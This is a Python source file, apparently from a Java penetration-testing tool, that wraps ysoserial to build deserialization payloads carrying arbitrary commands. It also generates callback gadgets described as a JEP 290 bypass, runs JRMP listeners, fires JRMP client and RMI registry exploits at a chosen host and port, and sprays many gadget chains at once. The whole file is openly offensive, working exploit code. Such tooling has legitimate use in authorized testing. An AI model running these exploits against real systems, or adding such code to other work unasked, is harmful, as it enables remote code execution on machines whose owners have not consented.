"""YsoserialWrapper — subprocess-based interface to ysoserial.jar.

Supports:
  - Payload generation (any gadget + command)
  - URLDNS canary generation
  - JRMPClient gadget generation (for JEP 290 bypass)
  - JRMP listener mode (via ysoserial.exploit.JRMPListener)
  - Gadget spraying (try multiple gadgets)
  - LRU caching for repeated generation
  - Fork mode (background subprocess)
"""

from __future__ import annotations

import hashlib
import os
import re
import subprocess
from functools import cached_property, lru_cache
from pathlib import Path
from typing import Any

from javapwner.exceptions import PayloadError

# Ysoserial exits with code 1 even when just printing help/gadget list.
_GADGET_PATTERN = re.compile(r"^\s{3,}(\w+)\s+@\w+", re.MULTILINE)

_TIMEOUT_GENERATE = 30  # seconds


def _find_ysoserial_jar() -> Path | None:
    """Locate ysoserial.jar using the documented search order."""
    # 1. Environment variable
    env_path = os.environ.get("YSOSERIAL_PATH")
    if env_path:
        p = Path(env_path)
        if p.is_file():
            return p

    # 2. lib/ysoserial.jar relative to this file's package root
    pkg_root = Path(__file__).resolve().parent.parent.parent  # project root
    candidate = pkg_root / "lib" / "ysoserial.jar"
    if candidate.is_file():
        return candidate

    # 3. CWD
    cwd_candidate = Path.cwd() / "ysoserial.jar"
    if cwd_candidate.is_file():
        return cwd_candidate

    return None


class YsoserialWrapper:
    """Thin wrapper around ysoserial invoked via subprocess.

    Parameters
    ----------
    jar_path:
        Path to ysoserial-all.jar.  If ``None``, auto-detected.
    fork:
        If ``True``, long-running operations (like listeners) are started
        as background subprocesses that don't block.
    """

    def __init__(self, jar_path: str | Path | None = None, fork: bool = False):
        if jar_path is not None:
            self._jar = Path(jar_path)
        else:
            found = _find_ysoserial_jar()
            if found is None:
                raise PayloadError(
                    "ysoserial.jar not found. Set YSOSERIAL_PATH env var, "
                    "place it in lib/ysoserial.jar, or put it in CWD."
                )
            self._jar = found
        self._fork = fork
        self._background_procs: list[subprocess.Popen] = []
        # Per-instance cache (I.2) — keyed on (gadget, command).
        # Instance-level so that different jar_path instances don't share state.
        self._cache: dict[str, bytes] = {}

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def generate(self, gadget: str, command: str) -> bytes:
        """Generate a serialized payload for *gadget* executing *command*.

        Returns the raw bytes of the payload. Uses an LRU cache to avoid
        regenerating identical payloads. Raises :class:`PayloadError`
        on failure, empty output, or timeout.
        """
        cache_key = f"{gadget}:{command}"
        if cache_key in self._cache:
            return self._cache[cache_key]

        try:
            result = subprocess.run(
                ["java", "-jar", str(self._jar), gadget, command],
                capture_output=True,
                timeout=_TIMEOUT_GENERATE,
            )
        except subprocess.TimeoutExpired as exc:
            raise PayloadError(f"ysoserial timed out after {_TIMEOUT_GENERATE}s") from exc
        except FileNotFoundError as exc:
            raise PayloadError("java binary not found in PATH") from exc

        payload = result.stdout
        if not payload:
            stderr_hint = result.stderr.decode(errors="replace")[:200]
            raise PayloadError(
                f"ysoserial returned empty payload for gadget '{gadget}'. "
                f"Stderr: {stderr_hint}"
            )

        self._cache[cache_key] = payload
        return payload

    def generate_urldns(self, url: str) -> bytes:
        """Convenience wrapper for the URLDNS gadget (no Java needed on target)."""
        return self.generate("URLDNS", url)

    @cached_property
    def _gadget_list(self) -> list[str]:
        try:
            result = subprocess.run(
                ["java", "-jar", str(self._jar)],
                capture_output=True,
                timeout=_TIMEOUT_GENERATE,
            )
        except subprocess.TimeoutExpired as exc:
            raise PayloadError("ysoserial timed out while listing gadgets") from exc
        except FileNotFoundError as exc:
            raise PayloadError("java binary not found in PATH") from exc

        # ysoserial prints the gadget table to stderr
        output = result.stderr.decode(errors="replace")
        gadgets = _GADGET_PATTERN.findall(output)
        return gadgets

    def list_gadgets(self) -> list[str]:
        """Return the list of available gadget chain names."""
        return list(self._gadget_list)

    def validate_gadget(self, gadget: str) -> bool:
        """Return True if *gadget* is present in the ysoserial gadget list."""
        return gadget in self._gadget_list

    # ------------------------------------------------------------------
    # I.1 — Exploit modes (JRMP listener, JRMP client, registry exploit)
    # ------------------------------------------------------------------

    def run_jrmp_listener(
        self, port: int, gadget: str, command: str,
    ) -> subprocess.Popen | subprocess.CompletedProcess:
        """Start ysoserial JRMP listener on *port*.

        In fork mode, returns a ``Popen`` (background).
        Otherwise, blocks until the listener exits.
        """
        cmd = [
            "java", "-cp", str(self._jar),
            "ysoserial.exploit.JRMPListener",
            str(port), gadget, command,
        ]
        if self._fork:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            )
            self._background_procs.append(proc)
            return proc

        try:
            return subprocess.run(
                cmd, capture_output=True, timeout=_TIMEOUT_GENERATE * 4,
            )
        except subprocess.TimeoutExpired as exc:
            raise PayloadError("JRMP listener timed out") from exc
        except FileNotFoundError as exc:
            raise PayloadError("java binary not found in PATH") from exc

    def run_jrmp_client(
        self, host: str, port: int, gadget: str, command: str,
    ) -> subprocess.CompletedProcess:
        """Run ysoserial JRMP client exploit against *host:port*."""
        cmd = [
            "java", "-cp", str(self._jar),
            "ysoserial.exploit.JRMPClient",
            f"{host}", str(port), gadget, command,
        ]
        try:
            return subprocess.run(
                cmd, capture_output=True, timeout=_TIMEOUT_GENERATE,
            )
        except subprocess.TimeoutExpired as exc:
            raise PayloadError("JRMP client timed out") from exc
        except FileNotFoundError as exc:
            raise PayloadError("java binary not found in PATH") from exc

    def run_rmi_registry_exploit(
        self, host: str, port: int, gadget: str, command: str,
    ) -> subprocess.CompletedProcess:
        """Run ysoserial RMI registry exploit against *host:port*."""
        cmd = [
            "java", "-cp", str(self._jar),
            "ysoserial.exploit.RMIRegistryExploit",
            host, str(port), gadget, command,
        ]
        try:
            return subprocess.run(
                cmd, capture_output=True, timeout=_TIMEOUT_GENERATE,
            )
        except subprocess.TimeoutExpired as exc:
            raise PayloadError("RMI registry exploit timed out") from exc
        except FileNotFoundError as exc:
            raise PayloadError("java binary not found in PATH") from exc

    # ------------------------------------------------------------------
    # I.3 — JRMPClient gadget generation
    # ------------------------------------------------------------------

    def generate_jrmp_client_gadget(self, listener_host: str, listener_port: int) -> bytes:
        """Generate a JRMPClient payload pointing to *listener_host:listener_port*.

        This gadget causes the target to connect back to a JRMP listener.
        Used for JEP 290 bypass: the connecting client's deserialization
        happens outside the JEP 290 filter.
        """
        return self.generate("JRMPClient", f"{listener_host}:{listener_port}")

    # ------------------------------------------------------------------
    # I.4 — Gadget spraying
    # ------------------------------------------------------------------

    def generate_spray(
        self, gadgets: list[str], command: str,
    ) -> dict[str, bytes | str]:
        """Generate payloads for multiple gadget chains.

        Returns a dict of ``{gadget_name: payload_bytes}`` for successful
        generations, and ``{gadget_name: error_string}`` for failures.
        """
        results: dict[str, bytes | str] = {}
        for gadget in gadgets:
            try:
                results[gadget] = self.generate(gadget, command)
            except PayloadError as exc:
                results[gadget] = f"ERROR: {exc}"
        return results

    # ------------------------------------------------------------------
    # I.5 — Fork support / cleanup
    # ------------------------------------------------------------------

    def cleanup(self) -> None:
        """Terminate any background subprocesses."""
        for proc in self._background_procs:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        self._background_procs.clear()

    @property
    def jar_path(self) -> Path:
        """Return the resolved path to ysoserial.jar."""
        return self._jar
